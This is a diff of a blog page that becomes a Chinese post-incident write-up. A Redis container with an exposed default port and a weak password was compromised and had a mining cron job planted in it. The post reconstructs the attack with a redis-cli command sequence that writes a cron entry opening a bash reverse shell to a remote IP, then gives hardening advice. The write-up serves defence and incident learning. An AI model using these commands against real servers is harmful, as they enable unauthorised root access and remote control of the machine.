@@ -103,23 +103,30 @@
 
 
 
-  <meta name="description" content="但屈指，流年偷换。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="几时">
-<meta property="og:url" content="https://hiram711.github.io/tags/项目/index.html">
+  <meta name="description" content="Redis配置不当致使Root被提权漏洞记录一下一次补漏洞的经历，难得有这么经典的案例 背景公司和某银行之间有些合作，委托银行部署了一个专门用于收罚款的程序。公司出服务器（阿里云ECS），银行出应用，因为公司毕竟是大客户，银行也没提收钱的事情，就这么免费帮忙部署了这么个应用。 当然有人占了银行的便宜，那么有人就要被银行占便宜，谁是这个倒霉的人呢，他就是银行外包。于是这个应用的开发和部署都是银行外包">
+<meta name="keywords" content="安全,redis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis配置不当致使Root被提权漏洞">
+<meta property="og:url" content="https://hiram711.github.io/2023/03/18/Redis配置不当致使Root被提权漏洞/index.html">
 <meta property="og:site_name" content="几时">
-<meta property="og:description" content="但屈指，流年偷换。">
+<meta property="og:description" content="Redis配置不当致使Root被提权漏洞记录一下一次补漏洞的经历，难得有这么经典的案例 背景公司和某银行之间有些合作，委托银行部署了一个专门用于收罚款的程序。公司出服务器（阿里云ECS），银行出应用，因为公司毕竟是大客户，银行也没提收钱的事情，就这么免费帮忙部署了这么个应用。 当然有人占了银行的便宜，那么有人就要被银行占便宜，谁是这个倒霉的人呢，他就是银行外包。于是这个应用的开发和部署都是银行外包">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://hiram711.github.io/blog/images/pasted-25.png">
+<meta property="og:image" content="https://hiram711.github.io/blog/images/pasted-26.png">
+<meta property="og:image" content="https://hiram711.github.io/blog/images/pasted-27.png">
+<meta property="og:image" content="https://hiram711.github.io/blog/images/pasted-28.png">
+<meta property="og:updated_time" content="2023-03-18T05:00:05.619Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="几时">
-<meta name="twitter:description" content="但屈指，流年偷换。">
+<meta name="twitter:title" content="Redis配置不当致使Root被提权漏洞">
+<meta name="twitter:description" content="Redis配置不当致使Root被提权漏洞记录一下一次补漏洞的经历，难得有这么经典的案例 背景公司和某银行之间有些合作，委托银行部署了一个专门用于收罚款的程序。公司出服务器（阿里云ECS），银行出应用，因为公司毕竟是大客户，银行也没提收钱的事情，就这么免费帮忙部署了这么个应用。 当然有人占了银行的便宜，那么有人就要被银行占便宜，谁是这个倒霉的人呢，他就是银行外包。于是这个应用的开发和部署都是银行外包">
+<meta name="twitter:image" content="https://hiram711.github.io/blog/images/pasted-25.png">
 
 
 
 
 
 
-  <link rel="canonical" href="https://hiram711.github.io/tags/项目/">
+  <link rel="canonical" href="https://hiram711.github.io/2023/03/18/Redis配置不当致使Root被提权漏洞/">
 
 
 
@@ -129,7 +136,7 @@
   };
 </script>
 
-  <title>标签: 项目 | 几时</title>
+  <title>Redis配置不当致使Root被提权漏洞 | 几时</title>
   
 
 
@@ -177,7 +184,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -253,7 +260,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
 
     
     
@@ -383,112 +390,292 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
           
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>项目<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hiram711.github.io/blog/2023/03/18/Redis配置不当致使Root被提权漏洞/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="几时西风">
+      <meta itemprop="description" content="但屈指，流年偷换。">
+      <meta itemprop="image" content="/blog/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="几时">
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/blog/2019/09/13/码农正确装逼姿势——书法篇/" itemprop="url">
-            
-              <span itemprop="name">码农正确装逼姿势——书法篇</span>
-            
-          </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Redis配置不当致使Root被提权漏洞
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-13T23:03:00+08:00" content="2019-09-13">
-          09-13
-        </time>
-      </div>
+              
+            
+          </h1>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
+          <span class="post-time">
 
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2023-03-18 12:57:00 / 修改时间：13:00:05" itemprop="dateCreated datePublished" datetime="2023-03-18T12:57:00+08:00">2023-03-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/blog/categories/安全/" itemprop="url" rel="index"><span itemprop="name">安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">2k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">2 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/blog/2019/08/28/一个小工具的开发日记/" itemprop="url">
-            
-              <span itemprop="name">一个小工具的开发日记</span>
-            
-          </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-28T12:27:00+08:00" content="2019-08-28">
-          08-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h1 id="Redis配置不当致使Root被提权漏洞"><a href="#Redis配置不当致使Root被提权漏洞" class="headerlink" title="Redis配置不当致使Root被提权漏洞"></a>Redis配置不当致使Root被提权漏洞</h1><p>记录一下一次补漏洞的经历，难得有这么经典的案例</p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>公司和某银行之间有些合作，委托银行部署了一个专门用于收罚款的程序。公司出服务器（阿里云ECS），银行出应用，因为公司毕竟是大客户，银行也没提收钱的事情，就这么免费帮忙部署了这么个应用。</p>
+<p>当然有人占了银行的便宜，那么有人就要被银行占便宜，谁是这个倒霉的人呢，他就是银行外包。于是这个应用的开发和部署都是银行外包搞定的，当时和外包对接的老哥提了必须基于docker部署该应用，方便以后迁移到k8s。</p>
+<p>然后好玩的来了，对于老哥的要求，外包公司很配合。一个基于nutz框架写的java应用，打包成jar包以后，docker build&amp;docker run。然后这应用需要redis\mysql\nginx这些基础设施，于是从网上copy了几个docker-compose文件，分别docker-compose up,暴露所有需要的端口即可。</p>
+<p>理论上来说，这些东西全放在一个docker-compose文件内，或者共用一个docker网络，也无需向外暴露接口，当时负责对接的老哥也没仔细审核，于是就埋下了隐患。</p>
+<h2 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h2><ol>
+<li><p>2023-03-17 17:39:40 ，阿里云云安全中心发出安全告警，提示“Redis配置不当致使Root被提权漏洞”；</p>
+</li>
+<li><p>攻击溯源如下图：</p>
+<p><img src="\blog\images\pasted-25.png" alt></p>
+</li>
+<li><p>操作文件中看到：</p>
+<p><img src="\blog\images\pasted-26.png" alt></p>
+</li>
+</ol>
+<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>从上面的提示来说，问题其实很明显，黑客是通过redis的提权漏洞获取到了系统的root权限然后在cron定时任务里放东西了，一般来说都是挖矿脚本之类。黑客通过redis的提权漏洞获取到的其实是docker容器内的root权限，所以设置的定时任务应当也是在docker容器内，影响范围其实控制在了容器内。</p>
+<p>果不其然，进入redis容器内，查看定时任务，看到了被恶意写入的挖矿脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it redis sh</span><br><span class="line">cd /var/spool/cron/</span><br><span class="line">cat root</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="\blog\images\pasted-27.png" alt></p>
+<p>随便百度一下，属于是老面孔了：</p>
+<p><img src="\blog\images\pasted-28.png" alt></p>
+<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p><strong>最简单的处理方法当然就是销毁被黑的redis容器然后重起一个，无非就是docker-compose down和up的事情，这些恶意写入的脚本只要没有存在docker持久化的文件系统内,自然就会销毁。</strong></p>
+<p><strong>但是，如果只是简单重启一下容器，后面再来同样的攻击咋办，因此需要找到防御薄弱造成问题的地方进行修补。</strong></p>
+<p>能通过redis提权，说明攻破了redis，简单看一下redis设置，果然发现两个问题：</p>
+<ol>
+<li>默认端口6379，明摆着告诉黑客，我是redis,欢迎光临；</li>
+<li>打开redis.conf一看，redis弱密码，1qaz@WSX，非常经典，暴露破解密码字典里的常客；</li>
+</ol>
+<p>大概能够回溯出黑客的攻击路径了：</p>
+<ol>
+<li><p>扫描服务器端口，找到redis的6379端口</p>
+</li>
+<li><p>暴力破解尝试连接redis</p>
+</li>
+<li><p>连接成功后，通过redis写入计划任务，具体方式应当是这样的：</p>
+<ul>
+<li><strong>在数据库中插入一条数据，将计划任务的内容作为value，key值随意，</strong></li>
+<li><strong>通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell,可以参照下面的命令执行</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.2 -p 6379</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.244.129/7777 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>目前最低成本的修补漏洞的方法：</p>
+<ol>
+<li>修改默认端口</li>
+<li>修改弱密码</li>
+<li>设置防火墙安全策略</li>
+</ol>
+<p>于是就这么简单处理了下然后联系外包公司修改他们应用里的配置，实际上除了上面两项，最好处理的办法是：</p>
+<ol>
+<li>redis容器如无必要，不对外开放端口，在容器内可以用docker network通信；</li>
+<li>配合防火墙安全策略（如iptables）限制连接，指定能够访问redis服务的ip;</li>
+<li>降权：以低权限运行 Redis 服务</li>
+<li>禁止使用root权限启动redis服务</li>
+</ol>
+<p>不过考虑到和外包协调的问题，还有不要对正在运行的应用的框架进行大改导致业务宕机，故先临时解决，后续再规划整改。</p>
+<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><ol>
+<li>阿里云的云安全服务是个好东西，这个钱不能省；</li>
+<li>应用部署在docker容器里其实也变相增加了安全性，如果被黑，影响范围能够小一些；</li>
+<li>能不向外暴露的端口就不要向外暴露；</li>
+<li>能不用默认端口地址的就不要用；</li>
+<li>别用弱密码甚至不设密码；</li>
+<li>权限够用即可，别啥都是root权限;</li>
+<li>部署上线前要严格审核（尤其是这种不要钱的外包帮忙做的）；</li>
+<li>防火墙安全策略是个好东西，尽可能设置安全策略限制ip访问；</li>
+</ol>
 
       
     </div>
 
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog/tags/安全/" rel="tag"># 安全</a>
+          
+            <a href="/blog/tags/redis/" rel="tag"># redis</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2023/03/15/Canal介绍与使用/" rel="next" title="Canal介绍与使用">
+                <i class="fa fa-chevron-left"></i> Canal介绍与使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -508,8 +695,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -644,6 +840,23 @@
       </div>
 
       
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis配置不当致使Root被提权漏洞"><span class="nav-number">1.</span> <span class="nav-text">Redis配置不当致使Root被提权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题发现"><span class="nav-number">1.2.</span> <span class="nav-text">问题发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题分析"><span class="nav-number">1.3.</span> <span class="nav-text">问题分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题解决"><span class="nav-number">1.4.</span> <span class="nav-text">问题解决</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#经验总结"><span class="nav-number">1.5.</span> <span class="nav-text">经验总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
       
         <div class="back-to-top">
@@ -774,6 +987,10 @@
 
 
   
+  <script src="/blog/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/blog/js/src/post-details.js?v=7.0.1"></script>
+
+
 
   
 
@@ -789,6 +1006,8 @@
 
   
 
+
+  
 
 
   
